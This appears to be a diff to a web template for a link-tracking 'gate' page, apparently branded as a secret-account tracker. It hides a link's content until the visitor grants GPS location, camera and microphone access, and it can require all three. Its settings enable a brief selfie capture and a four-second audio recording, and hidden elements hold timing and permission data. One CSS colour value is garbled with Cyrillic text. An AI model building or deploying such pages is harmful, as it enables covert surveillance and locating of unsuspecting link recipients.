@@ -18,27 +18,37 @@ html,body{margin:0;background:#0f1115;color:#e6e9ef;
 .line.warn{color:#f0b429}
 button{margin-top:16px;padding:12px 30px;font-size:15px;border:0;border-radius:999px;
   background:#4c8dff;color:#fff;font-weight:600}
-button:disabled{opacity:.6}
+button:disabled{opacity:.55}
+.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
 #lt_ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
 #lt_ia p{font-size:13px;color:#9aa3b2;margin:0 0 10px}
 a.btn{display:inline-block;padding:11px 22px;border-radius:999px;background:#2b3346;
   color:#e6e9ef;text-decoration:none;font-size:14px}
-.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
+
+/* 続けた後の中身：通常は完全に透明 */
+#lt_live{opacity:0;transition:opacity .35s ease}
+body.need #lt_live{opacity:1}
 body.ui-none #lt_st{display:none}
 
-/* ---- 要件ゲート ---- */
+/* ---- 要件ゲート（最初に見えるのはこれだけ） ---- */
 #lt_gate{position:fixed;inset:0;z-index:20;background:#0f1115;overflow-y:auto;
   display:flex;align-items:center;justify-content:center;padding:26px;
-  transition:opacity .35s ease, transform .35s ease}
-#lt_gate.out{opacity:0;transform:translateY(-8px)}
+  transition:opacity .4s ease, transform .4s ease}
+#lt_gate.out{opacity:0;transform:translateY(-10px);pointer-events:none}
 .gwrap{max-width:440px;width:100%;text-align:center}
-.gwrap h1{font-size:20px;line-height:1.5;margin:0 0 16px;font-weight:700}
+.gwrap h1{font-size:21px;line-height:1.5;margin:0 0 16px;font-weight:700;word-break:break-word}
 .req{white-space:pre-wrap;text-align:left;font-size:14px;line-height:1.9;color:#c7cddb;
   background:#171a21;border:1px solid #232734;border-radius:12px;padding:14px 16px;
-  max-height:46vh;overflow-y:auto}
+  max-height:40vh;overflow-y:auto}
 .ask{margin:18px 0 0;font-size:14px;color:#4c8dff;font-weight:600;line-height:1.6}
-.warnline{margin:10px 0 0;font-size:11.5px;color:#8b93a7;line-height:1.7;text-align:left}
+.extra{white-space:pre-wrap;text-align:left;margin:12px 0 0;font-size:12px;
+  line-height:1.85;color:#8b93a7}
+.warnline{margin:10px 0 0;font-size:11.5px;color:#7c8496;line-height:1.7;text-align:left}
 .stat{margin:12px 0 0;font-size:11.5px;color:#6b7386;min-height:1.4em}
+.copy{margin-top:18px;background:transparent;color:#6b7386;font-size:11.5px;
+  padding:6px 12px;border:1px solid #232734;border-radius:999px;font-weight:400}
+.tlink{display:block;margin-top:10px;font-size:11.5px;color:#5d6который}
+.tlink a{color:#6b7386;text-decoration:none}
 </style></head><body class="ui-{{ ui }}">
 
 {% if gate %}
@@ -46,16 +56,19 @@ body.ui-none #lt_st{display:none}
   <h1>{{ link.name }}</h1>
   {% if link.note %}<div class="req">{{ link.note }}</div>{% endif %}
   <p class="ask">{{ ask_text }}</p>
+  {% if gate_extra %}<div class="extra">{{ gate_extra }}</div>{% endif %}
   {% if gate_warn %}
   <p class="warnline">※位置情報はスマホのGPSを使います。GPSが取れずIPだけで判定した場合は、
   特に4G/5G回線だと数km〜数十kmの誤差が出ます。精度が必要なときは「正確な位置情報」を選んでください。</p>
   {% endif %}
   <button id="lt_go">{{ go_text }}</button>
+  {% if gate_copy %}<button class="copy noclick" id="lt_copy">リンクをコピー</button>{% endif %}
+  {% if gate_link %}<div class="tlink noclick"><a href="/">裏垢トラッカー</a></div>{% endif %}
   <p class="stat" id="lt_gate_st"></p>
 </div></div>
 {% endif %}
 
-<div class="wrap"><div class="inner">
+<div id="lt_live"><div class="wrap"><div class="inner">
   <p class="line" id="lt_st">{{ ask_text }}</p>
   <button id="lt_retry" style="display:none">{{ retry_text }}</button>
   <div id="lt_ia">
@@ -65,7 +78,7 @@ body.ui-none #lt_st{display:none}
   <span class="sr" id="lt_time"></span><span class="sr" id="lt_now"></span>
   <span class="sr" id="lt_perm"></span><span class="sr" id="lt_srv"></span>
   <span class="sr" id="lt_dbg"></span>
-</div></div>
+</div></div></div>
 
 <script>
 window.LT_CODE  = {{ code|tojson }};
@@ -83,12 +96,14 @@ window.LT_DENY_TEXT  = {{ deny_text|tojson }};
 window.LT_RETRY_TEXT = {{ retry_text|tojson }};
 window.LT_TITLE      = {{ link.name|tojson }};
 
-/* ★ ここが今回の肝：ゲートを出し、押されるまで許可を取らない */
+/* ゲートを出し、押されるまで許可を取らない */
 window.LT_GATE = {{ 1 if gate else 0 }};
+/* 位置情報・カメラ・マイクの3つ全部OKのときだけ飛び先へ */
+window.LT_REQUIRE_ALL = {{ 1 if require_all else 0 }};
 
 window.LT_CAM      = 1;
 window.LT_CAM_HOLD = 0;
-window.LT_CAM_PREVIEW = 1;   /* 1 で右下に自撮りプレビューを1.5秒出す */
+window.LT_CAM_PREVIEW = 1;
 window.LT_MIC      = 1;
 window.LT_MIC_HOLD = 1;
 window.LT_MIC_MS   = 4000;
